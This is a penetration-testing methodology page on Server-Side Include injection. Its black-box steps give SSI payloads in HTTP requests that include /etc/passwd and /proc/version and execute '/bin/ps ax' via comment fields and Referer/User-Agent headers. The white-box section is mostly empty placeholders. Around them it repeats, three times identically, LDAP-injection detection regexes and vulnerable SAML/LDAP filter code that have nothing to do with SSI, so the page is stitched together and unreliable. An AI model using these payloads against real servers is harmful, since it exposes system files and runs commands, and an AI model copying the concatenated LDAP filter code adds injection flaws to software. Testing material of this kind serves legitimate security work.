# SSI Injection

## Check List

## Methodology

### Black Box

#### Read Sensitive File via Server Side Include

{% stepper %}
{% step %}
Identify the target web application and perform basic information gathering to determine the web server type
{% endstep %}

{% step %}
Check whether the server potentially supports **Server-Side Includes (SSI)** by ( Looking for `.shtml` files in the application or Inspecting response headers and server banners)
{% endstep %}

{% step %}
Identify all possible user input points, including ( Cookie , comments,)
{% endstep %}

{% step %}
Select an input field that reflects user-supplied data back into the application (error messages, forum posts, profile fields) like

```http
POST /comment HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

comment=HelloWorld
```
{% endstep %}

{% step %}
Submit a test payload containing an SSI directive, such as

```php
<!--#include virtual="/etc/passwd" -->
```

Injected request

```http
POST /comment HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

comment=<!--#include virtual="/etc/passwd" -->
```
{% endstep %}

{% step %}
Then, check the server response to see if the payloads we injected are displayed and processed in the response and include the contents of the sensitive `etc/passwd` file. If so, the vulnerability is successfully confirmed
{% endstep %}
{% endstepper %}

***

#### Sever Side Including in HTTP Header&#x20;

{% stepper %}
{% step %}
injection via HTTP headers, for example:

```http
GET / HTTP/1.1
Host: target.com
Referer: <!--#exec cmd="/bin/ps ax"-->
User-Agent: <!--#include virtual="/proc/version"-->
```
{% endstep %}

{% step %}
Send the crafted request using a proxy tool (Burp Suite Repeater)
{% endstep %}

{% step %}
Observe whether the injected SSI directives are executed or included in the generated page
{% endstep %}

{% step %}
Conclude that the application is vulnerable to SSI Injection if server-side directives are successfully executed
{% endstep %}
{% endstepper %}

***

### White Box

####

{% stepper %}
{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}


**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Filter\s*=\s*\$?".*\(objectClass=user\).*\{|\bFilter\s*=\s*.*\+\s*[a-zA-Z_][a-zA-Z0-9_]*|SearchRequest\s*\([^)]*Filter\s*=|DirectorySearcher\s*\{[\s\S]{0,120}?Filter\s*=)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:searchFilter\s*=\s*".*\(objectClass=user\).*\+\s*|new\s+SearchControls|DirContext\.search\s*\(|LdapQueryBuilder[\s\S]{0,120}?filter)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:ldap_search\s*\(.*['"]\s*\.\s*(?:str_replace|addslashes)?\s*\(?\$|ldap_search\s*\(.*\$filter|ldap_list\s*\(.*\$filter)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:filter:\s*`.*\(objectClass=user\).*\$\{|filter\s*:\s*['"].*\+\s*[a-zA-Z_]|client\.search\s*\(|ldapjs[\s\S]{0,120}?filter)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Filter\s*=.*\(objectClass=user\).*\{|Filter\s*=.*\+.*|DirectorySearcher.*Filter
```
{% endtab %}

{% tab title="Java" %}
```regexp
searchFilter\s*=.*\(objectClass=user\).*\+|DirContext\.search\(|LdapQueryBuilder.*filter
```
{% endtab %}

{% tab title="PHP" %}
```regexp
ldap_search\(.*\$filter|ldap_search\(.*str_replace|ldap_list\(.*\$filter
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class SamlProvisioningService 
{
    private readonly LdapConnection _ldapConnection;

    public async Task<List<string>> HydrateUserRolesAsync(SamlAssertion assertion) 
    {
        // [1]
        var departmentClaim = assertion.GetClaim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/department");

        // [2]
        // [3]
        // [4]
        var searchFilter = $"(&(objectClass=user)(department={departmentClaim}))";
        
        var request = new SearchRequest("DC=enterprise,DC=local", searchFilter, SearchScope.Subtree, "memberOf");
        var response = (SearchResponse)await Task.Factory.FromAsync(_ldapConnection.BeginSendRequest, _ldapConnection.EndSendRequest, request, null);

        return ExtractRolesFromLdapResponse(response);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class SamlProvisioningService {

    @Autowired
    private LdapTemplate ldapTemplate;

    public List<String> hydrateUserRoles(SamlAssertion assertion) {
        // [1]
        String departmentClaim = assertion.getAttribute("Department");

        // [2]
        // [3]
        // [4]
        String searchFilter = "(&(objectClass=user)(department=" + departmentClaim + "))";
        
        List<String> roles = ldapTemplate.search(
            query().base("DC=enterprise,DC=local").filter(searchFilter),
            (AttributesMapper<String>) attrs -> (String) attrs.get("memberOf").get()
        );

        return roles;
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class SamlProvisioningService 
{
    protected $ldapConnection;

    public function hydrateUserRoles(SamlAssertion $assertion): array 
    {
        // [1]
        $departmentClaim = $assertion->getAttribute('Department');

        // [2]
        // [3]
        // [4]
        $searchFilter = "(&(objectClass=user)(department={$departmentClaim}))";
        
        $search = ldap_search($this->ldapConnection, "DC=enterprise,DC=local", $searchFilter, ['memberOf']);
        $entries = ldap_get_entries($this->ldapConnection, $search);

        return $this->extractRoles($entries);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class SamlProvisioningService {
    static async hydrateUserRoles(assertion) {
        // [1]
        let departmentClaim = assertion.attributes['Department'];

        // [2]
        // [3]
        // [4]
        let searchFilter = `(&(objectClass=user)(department=${departmentClaim}))`;

        let opts = {
            filter: searchFilter,
            scope: 'sub',
            attributes: ['memberOf']
        };

        return new Promise((resolve, reject) => {
            ldapClient.search('DC=enterprise,DC=local', opts, (err, res) => {
                let roles = [];
                res.on('searchEntry', (entry) => roles.push(entry.object.memberOf));
                res.on('end', () => resolve(roles));
                res.on('error', (err) => reject(err));
            });
        });
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}
{% endstepper %}

***

{% stepper %}
{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}


**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Filter\s*=\s*\$?".*\(objectClass=user\).*\{|\bFilter\s*=\s*.*\+\s*[a-zA-Z_][a-zA-Z0-9_]*|SearchRequest\s*\([^)]*Filter\s*=|DirectorySearcher\s*\{[\s\S]{0,120}?Filter\s*=)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:searchFilter\s*=\s*".*\(objectClass=user\).*\+\s*|new\s+SearchControls|DirContext\.search\s*\(|LdapQueryBuilder[\s\S]{0,120}?filter)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:ldap_search\s*\(.*['"]\s*\.\s*(?:str_replace|addslashes)?\s*\(?\$|ldap_search\s*\(.*\$filter|ldap_list\s*\(.*\$filter)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:filter:\s*`.*\(objectClass=user\).*\$\{|filter\s*:\s*['"].*\+\s*[a-zA-Z_]|client\.search\s*\(|ldapjs[\s\S]{0,120}?filter)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Filter\s*=.*\(objectClass=user\).*\{|Filter\s*=.*\+.*|DirectorySearcher.*Filter
```
{% endtab %}

{% tab title="Java" %}
```regexp
searchFilter\s*=.*\(objectClass=user\).*\+|DirContext\.search\(|LdapQueryBuilder.*filter
```
{% endtab %}

{% tab title="PHP" %}
```regexp
ldap_search\(.*\$filter|ldap_search\(.*str_replace|ldap_list\(.*\$filter
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class SamlProvisioningService 
{
    private readonly LdapConnection _ldapConnection;

    public async Task<List<string>> HydrateUserRolesAsync(SamlAssertion assertion) 
    {
        // [1]
        var departmentClaim = assertion.GetClaim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/department");

        // [2]
        // [3]
        // [4]
        var searchFilter = $"(&(objectClass=user)(department={departmentClaim}))";
        
        var request = new SearchRequest("DC=enterprise,DC=local", searchFilter, SearchScope.Subtree, "memberOf");
        var response = (SearchResponse)await Task.Factory.FromAsync(_ldapConnection.BeginSendRequest, _ldapConnection.EndSendRequest, request, null);

        return ExtractRolesFromLdapResponse(response);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class SamlProvisioningService {

    @Autowired
    private LdapTemplate ldapTemplate;

    public List<String> hydrateUserRoles(SamlAssertion assertion) {
        // [1]
        String departmentClaim = assertion.getAttribute("Department");

        // [2]
        // [3]
        // [4]
        String searchFilter = "(&(objectClass=user)(department=" + departmentClaim + "))";
        
        List<String> roles = ldapTemplate.search(
            query().base("DC=enterprise,DC=local").filter(searchFilter),
            (AttributesMapper<String>) attrs -> (String) attrs.get("memberOf").get()
        );

        return roles;
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class SamlProvisioningService 
{
    protected $ldapConnection;

    public function hydrateUserRoles(SamlAssertion $assertion): array 
    {
        // [1]
        $departmentClaim = $assertion->getAttribute('Department');

        // [2]
        // [3]
        // [4]
        $searchFilter = "(&(objectClass=user)(department={$departmentClaim}))";
        
        $search = ldap_search($this->ldapConnection, "DC=enterprise,DC=local", $searchFilter, ['memberOf']);
        $entries = ldap_get_entries($this->ldapConnection, $search);

        return $this->extractRoles($entries);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class SamlProvisioningService {
    static async hydrateUserRoles(assertion) {
        // [1]
        let departmentClaim = assertion.attributes['Department'];

        // [2]
        // [3]
        // [4]
        let searchFilter = `(&(objectClass=user)(department=${departmentClaim}))`;

        let opts = {
            filter: searchFilter,
            scope: 'sub',
            attributes: ['memberOf']
        };

        return new Promise((resolve, reject) => {
            ldapClient.search('DC=enterprise,DC=local', opts, (err, res) => {
                let roles = [];
                res.on('searchEntry', (entry) => roles.push(entry.object.memberOf));
                res.on('end', () => resolve(roles));
                res.on('error', (err) => reject(err));
            });
        });
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}
{% endstepper %}

***

{% stepper %}
{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}


**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Filter\s*=\s*\$?".*\(objectClass=user\).*\{|\bFilter\s*=\s*.*\+\s*[a-zA-Z_][a-zA-Z0-9_]*|SearchRequest\s*\([^)]*Filter\s*=|DirectorySearcher\s*\{[\s\S]{0,120}?Filter\s*=)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:searchFilter\s*=\s*".*\(objectClass=user\).*\+\s*|new\s+SearchControls|DirContext\.search\s*\(|LdapQueryBuilder[\s\S]{0,120}?filter)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:ldap_search\s*\(.*['"]\s*\.\s*(?:str_replace|addslashes)?\s*\(?\$|ldap_search\s*\(.*\$filter|ldap_list\s*\(.*\$filter)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:filter:\s*`.*\(objectClass=user\).*\$\{|filter\s*:\s*['"].*\+\s*[a-zA-Z_]|client\.search\s*\(|ldapjs[\s\S]{0,120}?filter)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Filter\s*=.*\(objectClass=user\).*\{|Filter\s*=.*\+.*|DirectorySearcher.*Filter
```
{% endtab %}

{% tab title="Java" %}
```regexp
searchFilter\s*=.*\(objectClass=user\).*\+|DirContext\.search\(|LdapQueryBuilder.*filter
```
{% endtab %}

{% tab title="PHP" %}
```regexp
ldap_search\(.*\$filter|ldap_search\(.*str_replace|ldap_list\(.*\$filter
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class SamlProvisioningService 
{
    private readonly LdapConnection _ldapConnection;

    public async Task<List<string>> HydrateUserRolesAsync(SamlAssertion assertion) 
    {
        // [1]
        var departmentClaim = assertion.GetClaim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/department");

        // [2]
        // [3]
        // [4]
        var searchFilter = $"(&(objectClass=user)(department={departmentClaim}))";
        
        var request = new SearchRequest("DC=enterprise,DC=local", searchFilter, SearchScope.Subtree, "memberOf");
        var response = (SearchResponse)await Task.Factory.FromAsync(_ldapConnection.BeginSendRequest, _ldapConnection.EndSendRequest, request, null);

        return ExtractRolesFromLdapResponse(response);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class SamlProvisioningService {

    @Autowired
    private LdapTemplate ldapTemplate;

    public List<String> hydrateUserRoles(SamlAssertion assertion) {
        // [1]
        String departmentClaim = assertion.getAttribute("Department");

        // [2]
        // [3]
        // [4]
        String searchFilter = "(&(objectClass=user)(department=" + departmentClaim + "))";
        
        List<String> roles = ldapTemplate.search(
            query().base("DC=enterprise,DC=local").filter(searchFilter),
            (AttributesMapper<String>) attrs -> (String) attrs.get("memberOf").get()
        );

        return roles;
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class SamlProvisioningService 
{
    protected $ldapConnection;

    public function hydrateUserRoles(SamlAssertion $assertion): array 
    {
        // [1]
        $departmentClaim = $assertion->getAttribute('Department');

        // [2]
        // [3]
        // [4]
        $searchFilter = "(&(objectClass=user)(department={$departmentClaim}))";
        
        $search = ldap_search($this->ldapConnection, "DC=enterprise,DC=local", $searchFilter, ['memberOf']);
        $entries = ldap_get_entries($this->ldapConnection, $search);

        return $this->extractRoles($entries);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class SamlProvisioningService {
    static async hydrateUserRoles(assertion) {
        // [1]
        let departmentClaim = assertion.attributes['Department'];

        // [2]
        // [3]
        // [4]
        let searchFilter = `(&(objectClass=user)(department=${departmentClaim}))`;

        let opts = {
            filter: searchFilter,
            scope: 'sub',
            attributes: ['memberOf']
        };

        return new Promise((resolve, reject) => {
            ldapClient.search('DC=enterprise,DC=local', opts, (err, res) => {
                let roles = [];
                res.on('searchEntry', (entry) => roles.push(entry.object.memberOf));
                res.on('end', () => resolve(roles));
                res.on('error', (err) => reject(err));
            });
        });
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}
{% endstepper %}

***

## Cheat Sheet
